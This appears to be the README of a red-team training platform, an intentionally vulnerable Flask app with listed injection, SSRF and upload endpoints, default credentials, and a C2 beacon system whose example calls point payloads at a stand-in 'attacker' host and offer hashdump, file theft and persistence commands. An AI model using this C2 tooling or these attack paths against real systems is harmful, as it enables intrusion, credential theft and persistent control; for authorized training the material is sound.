# Monolith Pentest Framework

> ⚠️ **WARNING**: This application contains intentional security vulnerabilities for educational and red team training purposes. **DO NOT deploy in production environments.**

## Production Başlatma (Senior Seviye)

Uygulamayı production-ready şekilde başlatmak için:

```bash
make run-prod
```

veya doğrudan:

```bash
PYTHONPATH=. .venv/bin/gunicorn -w 4 -b 0.0.0.0:8080 wsgi:app
```

Bu şekilde uygulama, 4 worker ile 8080 portunda production-ready olarak çalışır.

---

## 🎯 Vulnerable by Design - Attack Paths

Bu proje, **red team eğitimi** ve **pentest pratikleri** için kasıtlı güvenlik açıkları içerir.

### Attack Path Documentation

| # | Attack Path | Difficulty | Description |
|---|-------------|------------|-------------|
| 1 | [SQL Injection → Data Leak](docs/attack-paths/sql-injection-to-data-leak.md) | Easy | SQLi ile veritabanı dump |
| 2 | [Command Injection → RCE](docs/attack-paths/command-injection-to-rce.md) | Easy | CMDi ile reverse shell |
| 3 | [SSTI → RCE](docs/attack-paths/ssti-to-rce.md) | Medium | Template injection ile kod çalıştırma |
| 4 | [Deserialization → RCE](docs/attack-paths/deserialization-to-rce.md) | Hard | Pickle/JSON deserialization |
| 5 | [JWT Weakness → IDOR](docs/attack-paths/jwt-weakness-to-idor.md) | Medium | Zayıf JWT ile hesap ele geçirme |
| 6 | [File Upload → Webshell](docs/attack-paths/file-upload-to-webshell.md) | Easy | Webshell yükleme |
| 7 | [SSRF → Internal Leak](docs/attack-paths/ssrf-to-internal-leak.md) | Medium | Cloud metadata çalma |
| 8 | [CORS Misconfig → Cred Leak](docs/attack-paths/cors-misconfig-to-cred-leak.md) | Medium | CORS ile credential theft |
| 9 | [Weak Creds → Dashboard → RCE](docs/attack-paths/weak-creds-to-rce.md) | Easy-Medium | Brute-force + CMDi chain |

### Default Credentials (Lab Only!)
```
admin:admin123
analyst:analyst123
```

### Vulnerable Endpoints
- `/vuln/sqli?id=` - SQL Injection
- `/vuln/cmdi?cmd=` - Command Injection  
- `/vuln/ssti?name=` - Server-Side Template Injection
- `/vuln/deserialize` - Insecure Deserialization
- `/vuln/upload` - Unrestricted File Upload
- `/vuln/ssrf?url=` - Server-Side Request Forgery
- `/api/vuln/` - API vulnerabilities (JWT, IDOR, Mass Assignment)

---

## 🔴 C2 Listener & Beacon Support

Real Mythic/Sliver-style beacon management system for persistent agent control.

### Features
- **Real Beacon Protocol**: HTTP check-in → task queue → result collection
- **Multi-language Agents**: Python, PowerShell, Bash, PHP
- **Encrypted Communications**: Fernet AES-256 encryption (optional)
- **Task Management**: Queue commands, collect output, store loot
- **Live Status Tracking**: Active/Dormant/Dead beacon states

### Beacon API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/c2/beacon/checkin` | POST | Agent check-in & task retrieval |
| `/c2/beacon/result/<id>` | POST | Submit task results |
| `/c2/beacons` | GET | List all beacons |
| `/c2/beacons/<id>/task` | POST | Queue task for beacon |
| `/c2/beacons/<id>/kill` | POST | Terminate beacon |
| `/c2/payloads/generate` | POST | Generate agent payload |
| `/c2/payloads/types` | GET | List payload types |
| `/c2/stats` | GET | C2 statistics |
| `/c2/loot` | GET | Harvested credentials |

### Quick Start - Deploy Agent

1. Generate payload from UI (`/c2`) or API:
```bash
curl -X POST http://localhost:8080/c2/payloads/generate \
  -H "Content-Type: application/json" \
  -d '{"type":"python","c2_url":"http://attacker:8080/c2/beacon","options":{"sleep":30}}'
```

2. Deploy agent on target:
```bash
python3 beacon.py
```

3. Interact via UI or API:
```bash
# Queue shell command
curl -X POST http://localhost:8080/c2/beacons/BEACON_ID/task \
  -H "Content-Type: application/json" \
  -d '{"command":"shell","args":["whoami"]}'
```

### Available Payload Types
- `python` - Full Python beacon agent
- `python_oneliner` - Compressed base64 one-liner
- `powershell` - PowerShell beacon script
- `powershell_encoded` - Base64 encoded PS command
- `bash` - Bash/Shell beacon
- `php` - PHP beacon/webshell hybrid

### Agent Commands
- `shell <cmd>` - Execute shell command
- `download <path>` - Download file from target
- `upload <path> <data>` - Upload file to target
- `hashdump` - Dump password hashes
- `ps` - List processes
- `sleep <seconds>` - Change sleep interval
- `persist` - Install persistence mechanism
- `exit` - Terminate agent

---

![Coverage Target](https://img.shields.io/badge/coverage%20target-50%25-yellow)

Modular Flask-based pentest platform with services, routes, templates, and worker queue support.

## Structure

- `cyber.py` - app entrypoint and core bootstrap
- `cyberapp/routes/` - Flask blueprints
- `cyberapp/services/` - business logic and helpers
- `cyberapp/models/` - data access layer
- `templates/` - HTML templates
- `cybermodules/` - legacy modules and engines
- `tests/` - unit tests

## Run (dev)

```
python3 cyber.py
```

## Docker

```
docker build -t monolith .
docker run --rm -p 5000:5000 monolith
```

## Docker Compose

```
docker compose up --build
```

## Environment

Copy `.env.example` to `.env` and adjust secrets.

```
ADMIN_PASS=change_me
ANALYST_PASS=change_me
MONOLITH_HOST=127.0.0.1
MONOLITH_PORT=5000
MONOLITH_LOG_LEVEL=INFO
MONOLITH_QUEUE=local
REDIS_URL=redis://localhost:6379/0
```

## Queue

- Default: in-process queue
- Optional: RQ backend

```
export MONOLITH_QUEUE=rq
./run_rq_worker.sh
```

## Migrations

Database schema is managed via Alembic migrations.

Common commands:
- `python3 cyber.py --db-upgrade`
- `python3 cyber.py --db-current`
- `python3 cyber.py --db-revision "add feature"`

Coverage policy (incremental):
- Current gate: 50% for core app layers (`cyberapp/routes`, `cyberapp/services`, `cyberapp/models`)
- Target: increase to 60%, then 70% as tests expand
- Update badge: `python3 scripts/update_coverage_badge.py`
- Optional git hook: `python3 scripts/install_git_hooks.py`

```
alembic revision -m "add new table"
alembic upgrade head
```

## Tests

```
python3 -m unittest discover -s tests
```
